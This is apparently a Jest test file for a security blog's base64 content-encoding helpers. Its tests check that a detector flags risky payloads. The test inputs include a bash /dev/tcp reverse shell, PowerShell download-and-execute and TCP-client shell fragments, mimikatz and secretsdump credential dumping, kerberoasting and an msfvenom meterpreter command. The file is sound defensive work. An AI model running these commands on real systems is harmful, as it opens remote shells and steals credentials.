// Phase 1.5.13 — content-encoding primitives test suite.
//
// SENIOR ARCHITECT NOTE: pure-function tests under Node environment. No
// React render, no jsdom — component test infrastructure deferred to Phase
// 4 per mentor scope decision. These tests cover the encode/decode
// roundtrip + risky-pattern detection that gate the migration.

import {
  encodePayload,
  decodePayload,
  isLikelyRiskyPayload,
} from './content-encoding'

describe('content-encoding — base64 + risky-pattern primitives', () => {
  describe('encodePayload', () => {
    it('T-CE01: produces valid base64 (regex-conformant output)', () => {
      // Sanity: output must match standard base64 alphabet + optional padding.
      // SAFE_BASE64_RE is replicated here so the test fails closed if the
      // module ever switches to a base64 variant (url-safe, no-padding, etc.)
      // without corresponding test update.
      const output = encodePayload('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')
      expect(output).toMatch(/^[A-Za-z0-9+/]+={0,2}$/)
      expect(output.length).toBeGreaterThan(0)
    })
  })

  describe('decodePayload + roundtrip', () => {
    it('T-CE02: roundtrip preserves identity for ASCII and UTF-8 inputs', () => {
      // ASCII path
      const ascii = 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
      expect(decodePayload(encodePayload(ascii))).toBe(ascii)

      // UTF-8 Turkish — confirms the TextEncoder/Buffer path handles
      // multi-byte characters (ğ, ı, ş — common in Turkish blog comments).
      const turkish = 'Saldırgan IP\'si değiştirilecek — bağlantı kuruluyor'
      expect(decodePayload(encodePayload(turkish))).toBe(turkish)
    })

    it('T-CE03: decodePayload throws on invalid base64 input', () => {
      // SENIOR ARCHITECT NOTE: defensive validation — if a copy-paste
      // mishap puts non-base64 garbage into an MDX data="..." attribute,
      // we want a loud failure (caught by EncodedCodeBlock's error
      // fallback) rather than silently emitting gibberish into the page.
      expect(() => decodePayload('invalid base64!!!')).toThrow()
      expect(() => decodePayload('not%valid')).toThrow()
      expect(() => decodePayload('contains spaces')).toThrow()
    })
  })

  describe('isLikelyRiskyPayload', () => {
    it('T-CE04: detects classic bash reverse shell as risky', () => {
      // The exact pattern that triggered the original Defender flag.
      expect(
        isLikelyRiskyPayload('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'),
      ).toBe(true)
    })

    it('T-CE05: benign commands are NOT flagged', () => {
      // Conservative-biased false-positive boundary. These are the kinds
      // of commands that appear constantly in pedagogical content and
      // must NOT force unnecessary encoding.
      expect(isLikelyRiskyPayload('whoami')).toBe(false)
      expect(isLikelyRiskyPayload('id')).toBe(false)
      expect(isLikelyRiskyPayload('ls -la')).toBe(false)
      expect(isLikelyRiskyPayload('cat /etc/passwd')).toBe(false)
      expect(isLikelyRiskyPayload('echo "hello world"')).toBe(false)
    })

    it('T-CE06: detects PowerShell payloads', () => {
      // The other half of the Defender heuristic — `!MTB` suffix on the
      // threat name marks the PowerShell variant.
      expect(
        isLikelyRiskyPayload('powershell -nop -c "IEX(New-Object Net.WebClient)"'),
      ).toBe(true)
      expect(
        isLikelyRiskyPayload('powershell -enc <base64-blob>'),
      ).toBe(true)
      expect(
        isLikelyRiskyPayload(
          '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1", 4444)',
        ),
      ).toBe(true)
    })

    it('T-CE07: roundtrip preserves multi-line content with embedded newlines', () => {
      // Code blocks in MDX are inherently multi-line; this asserts the
      // encoder doesn't collapse or escape `\n` into something the
      // decoder can't recover.
      const multiline = [
        '#!/bin/bash',
        '# Reverse shell — eğitim amaçlı',
        'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1',
        '',
        'echo "done"',
      ].join('\n')
      expect(decodePayload(encodePayload(multiline))).toBe(multiline)
    })

    it('T-CE08: detects AD / credential-dump tooling references', () => {
      // Active Directory post payloads — mimikatz, secretsdump, kerberoast
      // are individually flagged by Defender (and Sophos, ESET). Catalog
      // coverage check.
      expect(isLikelyRiskyPayload('mimikatz # sekurlsa::logonpasswords')).toBe(
        true,
      )
      expect(
        isLikelyRiskyPayload('python3 secretsdump.py -just-dc admin@dc'),
      ).toBe(true)
      expect(isLikelyRiskyPayload('GetUserSPNs.py -request')).toBe(true)
      expect(isLikelyRiskyPayload('msfvenom -p windows/meterpreter/reverse_tcp')).toBe(
        true,
      )
    })
  })
})
